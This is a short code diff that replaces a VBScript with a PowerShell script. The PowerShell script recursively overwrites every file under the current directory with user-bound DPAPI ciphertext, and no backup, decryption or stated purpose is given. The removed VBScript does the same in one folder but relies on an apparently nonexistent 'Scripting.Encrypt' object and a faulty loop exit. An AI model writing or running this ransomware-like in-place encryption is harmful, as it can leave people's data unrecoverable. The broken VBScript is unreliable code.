@@ -1,24 +1,11 @@
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-Set objCrypto = CreateObject("Scripting.Encrypt")
+$directories = Get-ChildItem -Directory -Recurse
 
-' Collect file names in the current directory
-For Each objFile In objFSO.GetFolder(".").Files
-    ' Skip encryption for the script file itself
-    If objFile.Name = WScript.ScriptName Then
-        ' Skip to the next iteration of the loop
-        Exit For
-    End If
-    
-    ' Read the file contents
-    Set objTextFile = objFSO.OpenTextFile(objFile.Path)
-    contents = objTextFile.ReadAll
-    objTextFile.Close
-    
-    ' Encrypt the file contents
-    encryptedContents = objCrypto.Encrypt(contents)
-    
-    ' Write the encrypted contents back to the file
-    Set objEncryptedFile = objFSO.CreateTextFile(objFile.Path, True)
-    objEncryptedFile.Write encryptedContents
-    objEncryptedFile.Close
-Next
+foreach ($directory in $directories) {
+    $files = Get-ChildItem -File -Path $directory.FullName -Recurse
+
+    foreach ($file in $files) {
+        $contents = Get-Content -Path $file.FullName -Encoding Byte
+        $encryptedContents = [System.Security.Cryptography.ProtectedData]::Protect($contents, $null, 'CurrentUser')
+        Set-Content -Path $file.FullName -Value $encryptedContents -Encoding Byte
+    }
+}
